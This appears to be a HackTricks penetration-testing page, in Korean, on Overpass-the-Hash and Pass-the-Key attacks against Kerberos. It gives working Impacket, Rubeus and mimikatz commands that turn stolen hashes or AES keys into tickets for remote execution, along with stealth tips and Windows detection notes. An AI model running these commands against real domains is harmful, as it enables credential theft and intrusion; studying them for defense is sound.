# Over Pass the Hash/Pass the Key

{{#include ../../banners/hacktricks-training.md}}


## Overpass The Hash/Pass The Key (PTK)

**Overpass The Hash/Pass The Key (PTK)** attack는 traditional NTLM protocol이 제한되고 Kerberos authentication이 우선시되는 환경을 대상으로 합니다. 이 attack은 사용자의 NTLM hash 또는 AES key를 활용해 Kerberos ticket을 요청하며, 이를 통해 network 내 resource에 unauthorized access할 수 있습니다.

엄밀히 말하면:

- **Over-Pass-the-Hash**는 일반적으로 **NT hash**를 **RC4-HMAC** Kerberos key를 통해 Kerberos TGT로 변환하는 것을 의미합니다.
- **Pass-the-Key**는 이미 **AES128/AES256**과 같은 Kerberos key를 보유하고 해당 key로 TGT를 직접 요청하는 보다 일반적인 방식입니다.

이 차이는 hardened environment에서 중요합니다. **RC4가 비활성화**되었거나 KDC에서 더 이상 기본값으로 간주되지 않는 경우 **NT hash만으로는 충분하지 않으며**, **AES key** 또는 이를 derive할 cleartext password가 필요합니다.

이 attack을 실행하려면 먼저 대상 user account의 NTLM hash 또는 password를 획득해야 합니다. 이 정보를 확보하면 해당 account의 Ticket Granting Ticket (TGT)을 얻을 수 있으며, 이를 통해 attacker는 해당 user에게 permission이 있는 service 또는 machine에 access할 수 있습니다.

다음 commands를 사용하여 process를 시작할 수 있습니다:<sup>[[1]](#references)</sup>
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
AES256이 필요한 시나리오에서는 `-aesKey [AES key]` 옵션을 사용할 수 있습니다:<sup>[[1]](#references)</sup>
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -aesKey <AES256_HEX>
export KRB5CCNAME=velociraptor.ccache
python wmiexec.py -k -no-pass jurassic.park/velociraptor@labwws02.jurassic.park
```
`getTGT.py`는 `-service <SPN>`을 사용하여 **AS-REQ를 통해 직접 service ticket을 요청**하는 것도 지원하며, 추가적인 TGS-REQ 없이 특정 SPN에 대한 ticket을 원할 때 유용합니다:
```bash
python getTGT.py -dc-ip 10.10.10.10 -aesKey <AES256_HEX> -service cifs/labwws02.jurassic.park jurassic.park/velociraptor
```
또한 획득한 ticket은 `smbexec.py` 또는 `wmiexec.py`와 같은 다양한 도구에서 사용될 수 있어 공격 범위를 확장합니다.

_PyAsn1Error_ 또는 _KDC cannot find the name_과 같은 문제는 일반적으로 Impacket library를 업데이트하거나 IP address 대신 hostname을 사용하면 해결되며, Kerberos KDC와의 호환성을 보장할 수 있습니다.

Rubeus.exe를 사용하는 대체 command sequence는 이 technique의 또 다른 측면을 보여줍니다:<sup>[[1]](#references)</sup>
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
이 방법은 **Pass the Key** 접근 방식을 따르며, 인증 목적으로 티켓을 직접 탈취하고 활용하는 데 중점을 둡니다. 실제로는 다음과 같습니다.

- `Rubeus asktgt`는 **raw Kerberos AS-REQ/AS-REP**를 직접 전송하므로, `/luid`를 사용해 다른 logon session을 대상으로 하거나 `/createnetonly`로 별도의 session을 생성하려는 경우가 아니라면 admin rights가 필요하지 않습니다.
- `mimikatz sekurlsa::pth`는 자격 증명 자료를 logon session에 패치하므로 **LSASS에 접근**하며, 일반적으로 local admin 또는 `SYSTEM`이 필요하고 EDR 관점에서 더 많은 흔적을 남깁니다.

Mimikatz 사용 예시:
```bash
sekurlsa::pth /user:velociraptor /domain:jurassic.park /ntlm:2a3de7fe356ee524cc9f3d579f2e0aa7 /run:cmd.exe
sekurlsa::pth /user:velociraptor /domain:jurassic.park /aes256:<AES256_HEX> /run:cmd.exe
```
Operational security를 준수하고 AES256을 사용하려면 다음 명령을 적용할 수 있습니다:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
`/opsec`은 Rubeus가 생성하는 traffic이 native Windows Kerberos와 약간 다르기 때문에 관련이 있습니다. 또한 `/opsec`은 **AES256** traffic을 대상으로 한다는 점에 유의하세요. RC4와 함께 사용하려면 일반적으로 `/force`가 필요하지만, 이렇게 하면 핵심 목적이 상당 부분 무효화됩니다. 최신 domain에서 **RC4 자체가 강력한 signal**이기 때문입니다.

## 탐지 참고

모든 TGT 요청은 DC에서 **event `4768`**을 생성합니다. 현재 Windows build에서는 이 event에 이전 writeup에서 언급된 것보다 더 유용한 field가 포함됩니다.

- `TicketEncryptionType`은 발급된 TGT에 사용된 enctype을 나타냅니다. 일반적인 값은 **RC4-HMAC**의 경우 `0x17`, **AES128**의 경우 `0x11`, **AES256**의 경우 `0x12`입니다.<sup>[[3]](#references)</sup>
- 업데이트된 event에는 `SessionKeyEncryptionType`, `PreAuthEncryptionType`, 그리고 client가 광고한 enctype도 표시됩니다. 이를 통해 **실제 RC4 의존성**과 혼동을 일으키는 legacy 기본값을 구분할 수 있습니다.
- 최신 environment에서 `0x17`이 확인되면 해당 account, host 또는 KDC fallback 경로가 여전히 RC4를 허용하며, 따라서 NT-hash 기반 Over-Pass-the-Hash에 더 적합하다는 좋은 단서가 됩니다.

Microsoft는 2022년 11월 Kerberos hardening update 이후 RC4 기본 동작을 점진적으로 줄여 왔으며, 현재 공개된 guidance는 **2026년 2분기 말까지 AD DC에서 RC4를 기본 가정 enctype에서 제거**하는 것입니다. Offensive 관점에서 이는 **AES를 사용한 Pass-the-Key**가 점점 더 안정적인 경로가 되는 반면, 기존의 **NT-hash-only OpTH**는 hardened estate에서 계속 더 자주 실패하게 된다는 의미입니다.<sup>[[3]](#references)</sup>

Kerberos encryption type 및 관련 ticket 동작에 대한 자세한 내용은 다음을 참고하세요.

{{#ref}}
kerberos-authentication.md
{{#endref}}

## 더 은밀한 버전

> [!WARNING]
> 각 logon session에는 한 번에 하나의 active TGT만 존재할 수 있으므로 주의하세요.

1. Cobalt Strike의 **`make_token`**을 사용하여 새로운 logon session을 생성합니다.
2. 그런 다음 Rubeus를 사용하여 기존 session에 영향을 주지 않고 새로운 logon session에 대한 TGT를 생성합니다.

Rubeus 자체에서도 sacrificial **logon type 9** session을 사용하여 유사한 isolation을 구현할 수 있습니다:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES256_HEX> /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
현재 session TGT를 덮어쓰지 않으므로, 일반적으로 ticket을 기존 logon session으로 가져오는 것보다 안전합니다.

## 참고 자료

- [1] [Tarlogic - Kerberos (II): Kerberos를 공격하는 방법](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)
- [2] [GhostPack - Rubeus (GitHub repository)](https://github.com/GhostPack/Rubeus)
- [3] [Microsoft Learn - Kerberos에서 RC4 사용 감지 및 조치](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)

{{#include ../../banners/hacktricks-training.md}}
